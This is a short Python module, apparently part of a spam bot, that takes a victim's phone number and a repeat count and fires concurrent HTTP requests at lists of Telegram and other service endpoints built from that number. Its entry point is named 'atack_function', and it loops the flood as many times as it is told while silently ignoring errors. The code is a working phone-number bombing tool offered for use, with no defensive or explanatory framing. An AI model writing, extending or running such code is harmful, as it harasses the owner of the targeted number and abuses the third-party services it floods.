from bot_funcs.spam.tg import urls as urls_
from bot_funcs.spam.otherspam import urls
import asyncio as a
from aiohttp import ClientSession


async def req(session, url):
    try:
        async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
            return await response.text()
    except:
        pass


async def starting(number):
    async with ClientSession() as session:
        services = (urls_(number) + urls(number))
        tasks = [a.ensure_future(req(session, service)) for service in services]
        await a.gather(*tasks)


def atack_function(number,laps):
    a.set_event_loop_policy(a.WindowsSelectorEventLoopPolicy())
    for _ in range(int(laps)):
        a.run(starting(number))
